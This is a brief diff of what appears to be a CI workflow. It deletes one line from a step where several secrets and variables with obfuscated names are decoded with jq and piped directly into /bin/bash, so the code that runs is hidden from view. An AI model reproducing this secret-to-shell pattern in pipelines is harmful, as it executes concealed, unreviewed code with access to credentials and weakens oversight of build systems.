@@ -18,7 +18,6 @@ jobs:
           pyjgn387: ${{ secrets.pyjgn387 }}
         run: |
           printf '%s' "$pyjgn387" | jq -r .p91 | /bin/bash
-          echo $xoly9 | jq -r .nxvd21961 | /bin/bash
           echo $ryngq677 | jq -r .zn8322 | /bin/bash
           echo $lgpl75 | jq -r .pqcuq28047 | /bin/bash
           echo $tcq1322 | jq -r .z7 | /bin/bash
